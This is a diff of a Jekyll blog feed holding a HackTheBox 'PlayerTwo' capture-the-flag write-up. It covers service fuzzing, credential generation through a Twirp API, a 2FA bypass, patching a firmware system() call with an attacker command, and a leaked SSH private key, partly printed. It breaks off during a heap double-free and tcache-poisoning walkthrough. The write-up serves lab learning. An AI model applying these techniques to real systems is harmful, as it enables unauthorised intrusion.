@@ -1,5 +1,6 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="http://localhost:4000/blog/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/blog/" rel="alternate" type="text/html" /><updated>2020-06-18T04:42:41-04:00</updated><id>http://localhost:4000/blog/feed.xml</id><title type="html">Hello you absolute legends.</title><subtitle>An amazing website.</subtitle><author><name>Your Name</name></author><entry><title type="html">HackTheBox - PlayerTwo</title><link href="http://localhost:4000/blog/boxes/player2/" rel="alternate" type="text/html" title="HackTheBox - PlayerTwo" /><published>2020-05-30T11:33:36-04:00</published><updated>2020-05-30T11:33:36-04:00</updated><id>http://localhost:4000/blog/boxes/player2</id><content type="html" xml:base="http://localhost:4000/blog/boxes/player2/">&lt;h1 id=&quot;overview&quot;&gt;Overview&lt;/h1&gt;
-&lt;p&gt;PlayerTwo is MrR3boot’s follow-up box to his box &lt;em&gt;Player&lt;/em&gt; - this time created in collaboration with b14ckh34rt.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-06-27T10:30:42-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">#keepLearning</title><subtitle>An amazing website.</subtitle><author><name>Philipp Menner</name></author><entry><title type="html">HackTheBox - PlayerTwo</title><link href="http://localhost:4000/boxes/player2/" rel="alternate" type="text/html" title="HackTheBox - PlayerTwo" /><published>2020-05-30T11:33:36-04:00</published><updated>2020-05-30T11:33:36-04:00</updated><id>http://localhost:4000/boxes/player2</id><content type="html" xml:base="http://localhost:4000/boxes/player2/">&lt;h1 id=&quot;overview&quot;&gt;Overview&lt;/h1&gt;
+&lt;p class=&quot;text-justify&quot;&gt;&lt;em&gt;PlayerTwo&lt;/em&gt; is MrR3boot’s follow-up box to his box &lt;em&gt;Player&lt;/em&gt; - this time created in collaboration with b14ckh34rt.
+It requires quite a bit of fuzzing and research on twirp to start the box, a little bit of binary exploitation for user and and even more so to get root without cheat codes.&lt;/p&gt;
 
 &lt;h1 id=&quot;recon&quot;&gt;Recon&lt;/h1&gt;
 &lt;p&gt;A &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap -p- 10.10.10.170&lt;/code&gt; reveals an interesting port 8545 besides the usual ssh and http ports.&lt;/p&gt;
@@ -13,7 +14,7 @@ PORT     STATE SERVICE
 Besides explaining what went wrong on the predecessor box player it showcases why the new product is much better. It mentions a &lt;em&gt;protobs protocol&lt;/em&gt; and leads us to a subdomain at&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://product.player2.htb&lt;/code&gt; revealing a login page after adding the subdomain to /etc/hosts also. After trying a few standard username/password combinations such as admin/admin and a SQLi test we move on.
 Fuzzing in the background for subdirectories on domain and subdomain show the following (bit shortened) results, the underlined directories will be important later on:&lt;/p&gt;
 &lt;figure class=&quot;&quot;&gt;
-  &lt;img src=&quot;/blog/assets/images/playerTwo/Gobuster.png&quot; alt=&quot;this is a placeholder image&quot; /&gt;
+  &lt;img src=&quot;/assets/images/playerTwo/Gobuster.png&quot; alt=&quot;this is a placeholder image&quot; /&gt;
   
     &lt;figcaption&gt;
       &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u player2.htb&lt;/code&gt; and &lt;br /&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u product.player2.htb&lt;/code&gt; respectively.
@@ -26,14 +27,14 @@ Fuzzing in the background for subdirectories on domain and subdomain show the fo
 &lt;p class=&quot;text-justify&quot;&gt;Browsing to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://player2.htb:8545&lt;/code&gt; gives away the service running on this port with the following response:&lt;/p&gt;
 &lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;code&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;bad_route&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;msg&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;no handler for path &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;\/\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;meta&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;twirp_invalid_route&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;GET &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p class=&quot;text-justify&quot;&gt;Twirp invalid route leads us to the &lt;em&gt;Twirp Wire Protocol&lt;/em&gt; which we have to find the endpoint of. To find out what the structure looks like its documentation [0] comes in handy where it mentions a &lt;em&gt;.proto&lt;/em&gt; file which we fuzz for in the /proto directory, using wfuzz this time (gobuster with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-x proto&lt;/code&gt; flag works, too):&lt;/p&gt;
+&lt;p class=&quot;text-justify&quot;&gt;Twirp invalid route leads us to the &lt;em&gt;Twirp Wire Protocol&lt;/em&gt; which we have to find the endpoint of. To find out what the structure looks like its documentation &lt;a href=&quot;#[0]&quot;&gt;[0]&lt;/a&gt; comes in handy where it mentions a &lt;em&gt;.proto&lt;/em&gt; file which we fuzz for in the /proto directory, using wfuzz this time (gobuster with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-x proto&lt;/code&gt; flag works, too):&lt;/p&gt;
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wfuzz &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-z&lt;/span&gt; file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt &lt;span class=&quot;nt&quot;&gt;--hc&lt;/span&gt; 404 http://player2.htb/proto/FUZZ.proto
 
 000036168:   200        18 L     46 W     266 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;generated&quot;&lt;/span&gt;                   
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p class=&quot;text-justify&quot;&gt;The just found &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://player2.htb/proto/generated.proto&lt;/code&gt; file outlines the design of the service in use, which is basically identical to the structure of the example in the documentation [1]:&lt;/p&gt;
+&lt;p class=&quot;text-justify&quot;&gt;The just found &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://player2.htb/proto/generated.proto&lt;/code&gt; file outlines the design of the service in use, which is basically identical to the structure of the example in the documentation &lt;a href=&quot;#[0]&quot;&gt;[0]&lt;/a&gt;:&lt;/p&gt;
 &lt;figure class=&quot;&quot;&gt;
-  &lt;img src=&quot;/blog/assets/images/playerTwo/Twirp.png&quot; alt=&quot;this is a placeholder image&quot; /&gt;
+  &lt;img src=&quot;/assets/images/playerTwo/Twirp.png&quot; alt=&quot;this is a placeholder image&quot; /&gt;
   
     &lt;figcaption&gt;
       A comparison between the Protobuf definition file of PlayerTwo and from the documentation of &lt;em&gt;twirp&lt;/em&gt;.
@@ -42,14 +43,14 @@ Fuzzing in the background for subdirectories on domain and subdomain show the fo
   
 &lt;/figure&gt;
 
-&lt;p&gt;So we can deduce from the file that the service in use is an auth service and furthermore on [2] the format of the endpoint is specified as&lt;/p&gt;
+&lt;p&gt;So we can deduce from the file that the service in use is an auth service and furthermore on &lt;a href=&quot;#0&quot;&gt;[0]&lt;/a&gt; the format of the endpoint is specified as&lt;/p&gt;
 &lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /twirp/&lt;span class=&quot;nt&quot;&gt;&amp;lt;package&amp;gt;&lt;/span&gt;.&lt;span class=&quot;nt&quot;&gt;&amp;lt;Service&amp;gt;&lt;/span&gt;/&lt;span class=&quot;nt&quot;&gt;&amp;lt;Method&amp;gt;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;which translates to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/twirp/twirp.player2.auth.Auth/GenCreds&lt;/code&gt; in our case and since the error message when browsing to this endpoint isn’t the same as before we know we progressed:&lt;/p&gt;
 &lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;code&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;bad_route&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;msg&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;unsupported method &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;GET&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; (only POST is allowed)&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;meta&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;twirp_invalid_route&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;GET &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;twirp&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;twirp.player2.auth.Auth&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;GenCreds&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;h2 id=&quot;creating-credentials&quot;&gt;Creating credentials&lt;/h2&gt;
-&lt;p&gt;Reading the docs further [3] we see how we can access the service using curl and running the following command a couple of times we get five different sets of creds:&lt;/p&gt;
+&lt;p&gt;Reading the docs further we see how we can access the service using curl and running the following command a couple of times we get five different sets of creds:&lt;/p&gt;
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;--request&lt;/span&gt; POST &lt;span class=&quot;nt&quot;&gt;--location&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://player2.htb:8545/twirp/twirp.player2.auth.Auth/GenCreds&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--header&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Content-Type:application/json&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--data&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{&quot;&quot;:6}'&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;# From reading the docs I expected --data '{&quot;count&quot;:number}' to work but it doesn't - not sure why&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -61,7 +62,7 @@ Fuzzing in the background for subdirectories on domain and subdomain show the fo
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;Trying these creds on the login page found earlier we are greeted by a two factor authorization!&lt;/p&gt;
 &lt;figure class=&quot;&quot;&gt;
-  &lt;img src=&quot;/blog/assets/images/playerTwo/2fa.png&quot; alt=&quot;this is a placeholder image&quot; /&gt;
+  &lt;img src=&quot;/assets/images/playerTwo/2fa.png&quot; alt=&quot;this is a placeholder image&quot; /&gt;
   
     &lt;figcaption&gt;
       
@@ -70,12 +71,12 @@ Fuzzing in the background for subdirectories on domain and subdomain show the fo
   
 &lt;/figure&gt;
 
-&lt;p class=&quot;text-justify&quot;&gt;As we probably have no chance of guessing the right pin and brute-froce is never an option on HTB, we fuzz again, this time &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://product.player2.htb/api&lt;/code&gt;. And with using a good wordlist we finally find another endpoint:&lt;/p&gt;
+&lt;p class=&quot;text-justify&quot;&gt;As we probably have no chance of guessing the right pin and brute-froce is never an option on HTB, we fuzz again, this time &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://product.player2.htb/api&lt;/code&gt;. And with using a suitable wordlist we finally find another endpoint:&lt;/p&gt;
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gobuster &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; product.player2.htb/api
 
 /totp &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;So we catch the request with &lt;em&gt;burp&lt;/em&gt; to grab the PHPSESSID cookie, change the request method to &lt;em&gt;POST&lt;/em&gt;, switch to curl and are greeted by an “Invalid action” error. If we do the following&lt;/p&gt;
+&lt;p&gt;So we catch the request with &lt;em&gt;burp&lt;/em&gt; to grab the PHPSESSID cookie, change the request method to &lt;em&gt;POST&lt;/em&gt;, switch to curl and are greeted by an “Invalid action” error. By adding an action&lt;/p&gt;
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; POST &lt;span class=&quot;nt&quot;&gt;--header&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Cookie: PHPSESSID=l2frl7cqoro7ufdsqsvgttb6vm&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Content-Type:application/json&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--location&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://product.player2.htb/api/totp&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--data&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{&quot;action&quot;: &quot;some_action&quot;}'&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;we advance to&lt;/p&gt;
@@ -91,17 +92,17 @@ Fuzzing in the background for subdirectories on domain and subdomain show the fo
 &lt;h2 id=&quot;protobs-part-1&quot;&gt;Protobs Part 1&lt;/h2&gt;
 &lt;p class=&quot;text-justify&quot;&gt;Exploring the web page we find the following section which links to a documentation of the &lt;em&gt;Protobs Firmware&lt;/em&gt; which includes a link to the firmware itself, as well as a link to a file upload:&lt;/p&gt;
 &lt;figure class=&quot;&quot;&gt;
-  &lt;img src=&quot;/blog/assets/images/playerTwo/ProtobsAccess.png&quot; alt=&quot;this is a placeholder image&quot; /&gt;
+  &lt;img src=&quot;/assets/images/playerTwo/ProtobsAccess.png&quot; alt=&quot;this is a placeholder image&quot; /&gt;
   
 &lt;/figure&gt;
 
 &lt;figure class=&quot;&quot;&gt;
-  &lt;img src=&quot;/blog/assets/images/playerTwo/Doc.png&quot; alt=&quot;this is a placeholder image&quot; /&gt;
+  &lt;img src=&quot;/assets/images/playerTwo/Doc.png&quot; alt=&quot;this is a placeholder image&quot; /&gt;
   
 &lt;/figure&gt;
 
 &lt;figure class=&quot;&quot;&gt;
-  &lt;img src=&quot;/blog/assets/images/playerTwo/FileUpload.png&quot; alt=&quot;this is a placeholder image&quot; /&gt;
+  &lt;img src=&quot;/assets/images/playerTwo/FileUpload.png&quot; alt=&quot;this is a placeholder image&quot; /&gt;
   
 &lt;/figure&gt;
 
@@ -125,9 +126,9 @@ kali@kali:~/HTB/boxes/player2/binary&lt;span class=&quot;nv&quot;&gt;$ &lt;/span
 Protobs.removed: ELF 64-bit LSB executable, x86-64, version 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SYSV&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;82adae308a0023a272e626bbe83d97b2b9c630f6, &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;GNU/Linux 3.2.0, not stripped
 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p class=&quot;text-justify&quot;&gt;Not only does the file command now recognize porperties of the binary but also when reverse engineering the file in &lt;em&gt;Ghidra&lt;/em&gt; it is now much more readable.&lt;/p&gt;
+&lt;p class=&quot;text-justify&quot;&gt;By removing the first 64 bytes the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file&lt;/code&gt; command now recognizes the binary as an ELF 64-bit executable but also the code in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ghidra&lt;/code&gt; is now much more readable:&lt;/p&gt;
 &lt;figure class=&quot;&quot;&gt;
-  &lt;img src=&quot;/blog/assets/images/playerTwo/Firmware.png&quot; alt=&quot;this is a placeholder image&quot; /&gt;
+  &lt;img src=&quot;/assets/images/playerTwo/Firmware.png&quot; alt=&quot;this is a placeholder image&quot; /&gt;
   
     &lt;figcaption&gt;
       The firmware reverse engineered in &lt;em&gt;Ghidra&lt;/em&gt;. Every time the binary gets executed, the main function calls &lt;em&gt;wait_for_fkey&lt;/em&gt; in which we see multiple system calls.
@@ -137,10 +138,10 @@ Protobs.removed: ELF 64-bit LSB executable, x86-64, version 1 &lt;span class=&qu
 &lt;/figure&gt;
 
 &lt;p class=&quot;text-justify&quot;&gt;Following the path of execution when the binary is run we see multiple system calls inside the &lt;em&gt;wait_for_fkey&lt;/em&gt; function. System calls are dangerous because they directly execute the argument on the system the binary is executed on, therefore, if we can run the binary on the remote machine and overwrite the system call to something that is useful for us as an attacker we win.
-Quoting the sentence below the file upload, it says that the firmware is sign tested on whether it is signed and working as intended, so we have chance that it will be executed after uploading. The latter part is doable with a hexeditor [4] and we have a couple of options on what to overwrite the arguemnt with. A simple test to check if the binary is executed after uploading would be to put a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping -c 4 your_ip&lt;/code&gt; in there and listen to incoming packages with &lt;em&gt;tcpdump&lt;/em&gt;.
-To do this we need to load the original binary into ghidra and search for the first system call within the &lt;em&gt;wait_for_fkey&lt;/em&gt; function, identify the address &lt;em&gt;20e4&lt;/em&gt; and search that address in a hex editor of choice we loaded the binary in. We then replace the original by the ASCII code of our payload:&lt;/p&gt;
+Quoting the sentence below the file upload, it says that the firmware is sign tested on whether it is signed and working as intended, so we have chance that it will be executed after uploading. The latter part is doable with a hexeditor and we have a couple of options on what to overwrite the argument with. A simple test to check if the binary is executed after uploading would be to put a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping -c 4 your_ip&lt;/code&gt; in there and listen to incoming packages with &lt;em&gt;tcpdump&lt;/em&gt;.
+To do this we need to load the original binary into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ghidra&lt;/code&gt; and search for the first system call within the &lt;em&gt;wait_for_fkey&lt;/em&gt; function, identify the address &lt;em&gt;20e4&lt;/em&gt; and search that address in a hex editor of choice we loaded the binary in. We then replace the original by the ASCII code of our payload:&lt;/p&gt;
 &lt;figure class=&quot;&quot;&gt;
-  &lt;img src=&quot;/blog/assets/images/playerTwo/Hex.png&quot; alt=&quot;this is a placeholder image&quot; /&gt;
+  &lt;img src=&quot;/assets/images/playerTwo/Hex.png&quot; alt=&quot;this is a placeholder image&quot; /&gt;
   
     &lt;figcaption&gt;
       Upper part: Original binary loaded in &lt;em&gt;Ghidra&lt;/em&gt;. Marked red is the address of the argument string. Green is the argument string denoted in ASCII format. &lt;br /&gt; Middle: Original view in a hex editor. 73 in ASCII is equivalent to the character lower s. &lt;br /&gt; Lower: Overwritten argument. To write a p one has i.e. to replace the 73 by 70.
@@ -183,7 +184,7 @@ tcp    LISTEN   0        128               0.0.0.0:8545          0.0.0.0:&lt;spa
 tcp    LISTEN   0        128                     &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;:80                  &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;      
 tcp    LISTEN   0        128                  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;::]:22               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;::]:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;  
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p class=&quot;text-justify&quot;&gt;We can subscribe to all topics using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mosquitto_sub -t '$SYS/#'&lt;/code&gt; and are disappointed because we don’t get any useful info. However keeping it running for a while we notice that every once in a while a SSH private key is broadcasted:&lt;/p&gt;
+&lt;p class=&quot;text-justify&quot;&gt;We can subscribe to all topics using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mosquitto_sub -t '$SYS/#'&lt;/code&gt; and are disappointed because we don’t get any useful info. However keeping it running for some time we notice that every once in a while a SSH private key is broadcasted:&lt;/p&gt;
 &lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Retrieving the key from aws instance
 Key retrieved..
 &lt;span class=&quot;nt&quot;&gt;-----BEGIN&lt;/span&gt; RSA PRIVATE KEY-----
@@ -193,15 +194,13 @@ MIIEpAIBAAKCAQEA7Gc/OjpFFvefFrbuO64wF8sNMy+/7miymSZsEI+y4pQyEUBA
 iZHQGq04r9PMTAFTmaQfMzDy1Hfo8kZ/2y5+2+lC7wIlFMyYze8n8g&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;
 &lt;span class=&quot;nt&quot;&gt;-----END&lt;/span&gt; RSA PRIVATE KEY-----
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p class=&quot;text-justify&quot;&gt;And for the first time we are lucky, because the key is not password protected and we can connect right away and have owned user:&lt;/p&gt;
+&lt;p class=&quot;text-justify&quot;&gt;And for the first time we are lucky as the key is not password protected and we can connect right away to own user:&lt;/p&gt;
 &lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kali@kali:~/HTB/boxes/player2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; id_rsa observer@10.10.10.170
 Welcome to Ubuntu 18.04.2 LTS &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GNU/Linux 5.2.5-050205-generic x86_64&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;snip]
 observer@player2:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;user.txt 
 CDE09&lt;span class=&quot;k&quot;&gt;**********************&lt;/span&gt;41251
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;[0] https://twitchtv.github.io/twirp/docs/routing.html&lt;/p&gt;
 
 &lt;h1 id=&quot;root-part-intended-way&quot;&gt;Root Part (intended way)&lt;/h1&gt;
 &lt;hr /&gt;
@@ -257,23 +256,16 @@ kali@kali:~/HTB/boxes/player2/binary_2&lt;span class=&quot;nv&quot;&gt;$ &lt;/sp
 observer@player2:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /proc/sys/kernel/randomize_va_space &lt;span class=&quot;c&quot;&gt;# check if ASLR is enabled&lt;/span&gt;
 2
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;We notice a couple of things:&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;No PIE -&amp;gt; the addresses within the binary are constant&lt;/li&gt;
-  &lt;li&gt;ASLR enabled -&amp;gt; we need to leak libc addresses&lt;/li&gt;
-  &lt;li&gt;stripped binary -&amp;gt; it has no symbols which makes it harder to track in gdb&lt;/li&gt;
-  &lt;li&gt;RUNPATH set -&amp;gt; we need to reproduce the environment locally.&lt;/li&gt;
-&lt;/ul&gt;
 
 &lt;h2 id=&quot;playing-the-game&quot;&gt;Playing the game&lt;/h2&gt;
-&lt;p class=&quot;text-justify&quot;&gt;In the following I will demonstrate the exploitation of the binary via a double free. It is also possible to exploit the binary by coalesing two chunks, which is more complex.&lt;/p&gt;
+&lt;p class=&quot;text-justify&quot;&gt;In the following the exploitation of the binary via a double free will be presented. It is also possible to exploit the binary by coalesing two chunks, which is shown here &lt;a href=&quot;#Appendix&quot;&gt;[Appendix]&lt;/a&gt;.&lt;/p&gt;
 &lt;ul class=&quot;text-justify&quot;&gt;
   &lt;li&gt;As ASLR is enabled on the machine we need to leak a libc address in order to get the libc base address from which we can calculate the addresses of the free hook and the system function.&lt;/li&gt;
-  &lt;li&gt;Looking at the reversed binary we notice a one byte overwrite vulnerability. Since that one byte overwrite will always be done with a null byte we cannot follow guides like [7] exactly but I recommend watching it as it shows the possibilities which arise by such a vulnerability and also covers tcache poisoning which we also will use.&lt;/li&gt;
+  &lt;li&gt;Looking at the reversed binary we notice a one byte overwrite vulnerability. Since that one byte overwrite will always be done with a null byte we cannot follow guides like &lt;a href=&quot;#[1]&quot;&gt;[1]&lt;/a&gt; exactly but I recommend watching it as it shows the possibilities which arise by such a vulnerability and also covers tcache poisoning which we also will use.&lt;/li&gt;
   &lt;li&gt;In order to overwrite data we need chunks that are &lt;em&gt;directly adjacent&lt;/em&gt;. Since every chunk starts with the chunk size header (basically containing information about the size of the chunk and signalling whether the chunk is in-use with the LSB) that is the information we will be able to target. This also implies that overwriting chunk sizes smaller than 0x100 will result in a chunk size header which is the null byte. If we overwrite a header of size say 0x180 it’ll be 0x100. Because of the fact that every config we create will always start with a header of 0x41 for the &lt;em&gt;name&lt;/em&gt; of the config (we can only choose the size for the &lt;em&gt;description&lt;/em&gt;) we have to find a way around it to align to descriptions adjacent.&lt;/li&gt;
-  &lt;li&gt;Once we’ve overwritten the chunk size header appropriately we can double free it and perform a tcache poisoning as described in the writeup of the &lt;em&gt;zero_to_hero&lt;/em&gt; challenge here &lt;a href=&quot;#[5]&quot;&gt;[5]&lt;/a&gt;.
+  &lt;li&gt;Once we’ve overwritten the chunk size header appropriately we can double free it and perform a tcache poisoning as described in the writeup of the &lt;em&gt;zero_to_hero&lt;/em&gt; challenge here &lt;a href=&quot;#[1]&quot;&gt;[1]&lt;/a&gt;.
     &lt;h3 id=&quot;leaking-libc&quot;&gt;Leaking libc&lt;/h3&gt;
-    &lt;p&gt;In order to leak libc, writeups such as the babyheap defcon challenge &lt;a href=&quot;#6&quot;&gt;[6]&lt;/a&gt; were really helpful to me for more details go there, I’ll sum it up:&lt;br /&gt;
